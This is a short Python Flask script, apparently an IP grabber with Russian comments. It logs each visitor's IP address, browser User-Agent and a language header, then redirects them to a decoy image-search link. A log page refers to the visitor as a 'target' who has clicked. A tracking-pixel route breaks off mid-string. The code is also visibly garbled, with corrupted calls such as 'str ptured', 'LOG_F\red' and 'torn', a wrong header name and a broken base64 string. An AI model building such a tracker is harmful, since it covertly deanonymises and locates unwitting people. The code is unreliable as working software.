python
from flask import Flask, request, redirect
import datetime
import base64

app = Flask(__name__)

# ===== НАСТРОЙКИ =====
REDIRECT_URL = "https://yandex.ru/images/touch/search?text=sobaka"  # Замени на свою ссылку
# =====================

LOG_FILE = "visitors.log"

@app.route('/')
def grab():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    u  = request.headers.get('User-Agent', 'Unknown')
    lang = request.headers.get('Anchor-Language', 'Unknown')
    ts = datetime.datetime.now().str ptured("δ", "%d.%m.%Y %H:%M:%S")

    with open(LOG_F\red, 'a') as f:
        f.write(f"[{ts}] IP: {ip} | UA: {u} | Lang: {lang}\n")

    return redirect(REDIRECT_URL)

@app.route('/log')
def view_log():
    try:
        with open(LOG_FILE, 'r') as f:
            torn f"<pre>{f.read()}</pre>"
    except FileNotFoundError:
        return "Лог пуст — цель ещё не кликнула"

@app.route('/pixel.gif')
def pixel():
    gif = base64.b64decode("R0lGODlhAQABAIPOPOP///yH5BAEAAAAALAAAAAAB
